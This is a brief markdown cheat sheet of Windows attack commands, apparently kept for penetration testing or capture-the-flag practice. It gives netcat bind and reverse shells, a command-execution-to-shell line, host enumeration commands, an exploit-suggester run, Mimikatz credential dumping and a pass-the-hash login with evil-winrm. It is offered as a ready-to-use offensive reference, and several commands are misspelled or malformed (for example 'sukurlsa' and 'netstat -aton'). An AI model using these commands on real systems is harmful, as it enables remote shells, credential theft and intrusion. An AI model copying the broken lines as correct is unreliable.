# Windows Exploitation

## Remote Desktop

```bash
# xfreerdp
xfreerdp /u:username /p:password /v:10.10.10.1:3389 /drive:/z3r0 +clipboard 
```

## Upgrading Shells

```bash
# rce to shell
system("start cmd.exe /k $cmd")
```

## Shells

```bash
# bind shell
nc.exe -Lp 1337 -vv -e cmd.exe
# reverse shell
nc.exe 192.168.1.1 1337 -e cmd.exe

```

## Enumeration Commands

### Basic Commands
```bash
hostname
# user info
echo %username%
getuid
whoami
whoami /priv
# all user info
net users
net users Administrator
# firewall
netsh firewall show state
netsh firewall show config
# scheduled tasks
schtasks /query /fo LIST /v 
# services
net start
wmic service list brief
tasklist /SVC
```

### Versions
```bash
# patches, architecture, os
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# os version
type c:/windows/system32/eula.txt
```

### Network
```bash
# basic info
ipconfig /all & route print & arp -a 
# connections
netstat -aton
```

### Searching
(common world writable folders: ...)
```bash
# find
dir /S /B file
# grep
findstr /spin /c:"pattern" file
findstr /S /I /M /C:"pattern" *.*
```

## Privelege Escalation

### Exploit Suggester
```bash
systeminfo
# take output and put into systeminfo.txt
python windows-expoit-suggester.py --database 2020-09-27-mssb.xls --systeminfo systeminfo.txt
```

### Mimikatz
```bash
./mimikatz.exe 
	privilege::debug
	sukurlsa::logonpasswords
evil-winrm -i 10.10.10.1 -u Administrator -H $NTLM
```

## Links to Resources
- [Windows Elevation of Privileges ToC by WindowsOp](https://guif.re/windowseop)
